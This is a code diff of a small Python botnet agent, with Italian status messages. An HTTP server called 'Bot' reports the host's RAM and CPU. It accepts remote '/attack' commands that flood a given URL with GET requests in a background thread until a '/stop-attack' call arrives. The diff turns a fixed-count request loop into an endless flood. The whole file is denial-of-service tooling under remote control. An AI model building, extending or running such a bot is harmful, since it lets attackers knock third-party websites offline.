@@ -2,6 +2,8 @@ import concurrent
 import json
 import platform
 import socket
+import threading
+from asyncio import Event
 from concurrent.futures import ThreadPoolExecutor
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
@@ -13,29 +15,39 @@ server_address = ('10.0.2.15', 15200)
 
 
 class Bot(BaseHTTPRequestHandler):
+    event = Event()
+
+    def set_header(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
 
     def do_GET(self):
         if self.path == "/client-info":
             ram, cpu = get_client_info()
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
+            self.set_header()
             self.wfile.write(json.dumps({
                 'ram': ram,
                 'cpu': cpu,
             }).encode('utf-8'))
+        if self.path == "/stop-attack":
+            self.event.set()
+            self.set_header()
+            self.wfile.write(json.dumps({'success': "Attacco fermato con successo"}).encode('utf-8'))
 
     def do_POST(self):
         if self.path == "/attack":
             content_length = int(self.headers['Content-Length'])
             body = json.loads(self.rfile.read(content_length).decode('utf-8'))
 
-            request_spam(body['url'], body['number_of_requests'])
+            t = threading.Thread(target=request_spam, args=(body['url'], self.event))
+            t.daemon = True
+            t.start()
 
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
             self.end_headers()
-            self.wfile.write(json.dumps({'success': "Attacco avvenuto con successo"}).encode('utf-8'))
+            self.wfile.write(json.dumps({'success': "Attacco avviato con successo"}).encode('utf-8'))
 
 
 def run():
@@ -49,9 +61,10 @@ def get_client_info():
     return ram, cpu
 
 
-def request_spam(url, n):
+def request_spam(url, e):
     try:
-        for _ in range(n):
+        while not e.is_set():
+            print(e)
             res = requests.get(url)
             print(res)
     except Exception as e:
